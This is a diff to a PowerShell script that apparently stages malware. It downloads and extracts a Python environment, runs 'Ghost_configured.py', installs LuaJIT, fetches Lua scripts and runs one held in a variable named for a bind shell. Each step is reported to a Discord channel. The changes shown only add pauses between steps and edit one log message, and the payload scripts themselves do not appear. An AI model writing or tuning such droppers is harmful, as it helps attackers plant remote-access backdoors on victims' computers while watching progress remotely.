@@ -70,7 +70,7 @@ function Get-File {
 
 # Function to wait for a minute
 function Wait-ForMinute {
-    Send-DiscordMessage -message "Waiting for 10 seconds before next step..."
+    Send-DiscordMessage -message "Waiting for 5 seconds before next step..."
     Start-Sleep -Seconds 5
 }
 
@@ -152,14 +152,18 @@ function Get-Execute-GhostConfig {
         Expand-Archive -Path $pythonEnvZipPath -DestinationPath $pythonEnvPath
         Wait-ForFile -FilePath "$pythonEnvPath\env\python.exe"
         Send-DiscordMessage -message "Extraction of Python environment completed."
+        Wait-ForMinute
     }
 
     if (Test-Path "$pythonEnvPath\env\python.exe") {
         $message = "Executing Ghost_configured.py with python.exe..."
         Send-DiscordMessage -message $message
         Start-Process -FilePath "$pythonEnvPath\env\python.exe" -ArgumentList $ghostConfigPyPath -NoNewWindow -Wait
+        Wait-ForMinute
+        Wait-ForMinute
         $message = "Execution of Ghost_configured.py completed."
         Send-DiscordMessage -message $message
+        Wait-ForMinute
     } else {
         $message = "Python environment setup failed, python.exe not found."
         Send-DiscordMessage -message $message
@@ -170,6 +174,7 @@ function Get-Execute-GhostConfig {
 if (-not (Test-Path $baseDir)) {
     New-Item -Path $baseDir -ItemType Directory -Force
     Send-DiscordMessage -message "Created base directory: $baseDir"
+    Wait-ForMinute
 }
 
 # Get LuaJIT if not already done
@@ -195,6 +200,7 @@ if (-not (Test-Path "$baseDir\lua54.exe")) {
         Expand-Archive -Path $luaZip -DestinationPath $baseDir
         $message = "Extraction completed to: $baseDir"
         Send-DiscordMessage -message $message
+        Wait-ForMinute
     } catch {
         $message = "Error extracting Lua ZIP file: $(${_})"
         Send-DiscordMessage -message $message
@@ -209,16 +215,19 @@ if (-not (Test-Path "$baseDir\lua54.exe")) {
 if (-not (Test-Path -Path $luaPathDir)) {
     New-Item -Path $luaPathDir -ItemType Directory -Force
     Send-DiscordMessage -message "Created directory: $luaPathDir"
+    Wait-ForMinute
 }
 
 if (-not (Test-Path -Path $srcDir)) {
     New-Item -Path $srcDir -ItemType Directory -Force
     Send-DiscordMessage -message "Created directory: $srcDir"
+    Wait-ForMinute
 }
 
 if (-not (Test-Path -Path $jitDir)) {
     New-Item -Path $jitDir -ItemType Directory -Force
     Send-DiscordMessage -message "Created directory: $jitDir"
+    Wait-ForMinute
 }
 
 # Copy LuaJIT JIT files
@@ -235,6 +244,7 @@ if (Test-Path -Path $jitSourceDir) {
 # Copy luajit.exe and lua51.dll to Luapath base directory
 if (Test-Path -Path "$luaJitPath\src\luajit.exe") {
     Copy-File -Source "$luaJitPath\src\luajit.exe" -Destination "$luaPathDir\luajit.exe"
+    Wait-ForMinute
 } else {
     $message = "luajit.exe does not exist in the source directory: $luaJitPath\src"
     Send-DiscordMessage -message $message
@@ -243,13 +253,12 @@ if (Test-Path -Path "$luaJitPath\src\luajit.exe") {
 
 if (Test-Path -Path "$luaJitPath\src\lua51.dll") {
     Copy-File -Source "$luaJitPath\src\lua51.dll" -Destination "$luaPathDir\lua51.dll"
+    Wait-ForMinute
 } else {
     $message = "lua51.dll does not exist in the source directory: $luaJitPath\src"
     Send-DiscordMessage -message $message
     exit 1
 }
-
-Wait-ForMinute
 
 # Download Lua scripts and cmd file
 $scriptUrls = @{
@@ -275,6 +284,7 @@ try {
     Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList "$bindshellScriptPath" -NoNewWindow -Wait
     $message = "Lua scripts file executed successfully."
     Send-DiscordMessage -message $message
+    Wait-ForMinute
 } catch {
     $message = "Error executing scripts file: $(${_})"
     Send-DiscordMessage -message $message
